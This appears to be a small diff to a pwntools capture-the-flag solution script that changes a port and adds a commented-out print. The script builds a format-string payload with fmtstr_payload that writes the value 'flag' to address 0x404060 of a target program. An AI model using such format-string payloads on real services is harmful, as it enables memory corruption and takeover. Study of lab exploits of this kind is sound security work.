@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 from pwn import *
 
-port = 63315
+port = 56458
 offset = 14
 
 # set the related info of elf file to pwntools
@@ -25,6 +25,8 @@ offset = autofmt.offset
 
 # fmtstr_payload(offset, {address: value})
 payload = fmtstr_payload(offset, {0x404060: 0x67616c66})
+
+# print(payload)
 
 p.sendline(payload)
 
